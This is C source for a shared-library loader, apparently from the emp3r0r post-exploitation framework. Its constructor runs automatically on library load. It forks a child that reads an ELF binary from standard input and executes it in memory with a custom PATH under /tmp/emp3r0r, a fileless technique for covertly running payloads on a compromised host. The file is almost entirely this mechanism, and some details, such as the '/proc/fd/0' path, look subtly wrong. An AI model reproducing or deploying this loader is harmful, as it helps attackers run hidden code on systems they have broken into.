#include <sys/types.h>
#include <unistd.h>
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>

#include "elf.h"

void __attribute__((constructor)) initLibrary(void) {
  pid_t child = fork();
  if (child == 0) {
    puts("In child process");
    FILE *f = fopen("/proc/fd/0", "rb");

    fseek(f, 0, SEEK_END);
    int size = ftell(f);

    fseek(f, 0L, SEEK_SET);

    char *buf = malloc(size);
    fread(buf, size, 1, f);
    fclose(f);
    char exe[1024];
    if (readlink("/proc/self/exe", exe, 1024) < 0)
      return;

    // Run the ELF
    char *argv[] = {exe, NULL};
    char *envv[] = {
        "PATH=/bin:/usr/bin:/sbin:/usr/sbin:/tmp/emp3r0r/bin-aksdfvmvmsdkg",
        "HOME=/tmp", NULL};
    elf_run(buf, argv, envv);
  }
}

void __attribute__((destructor)) cleanUpLibrary(void) {}
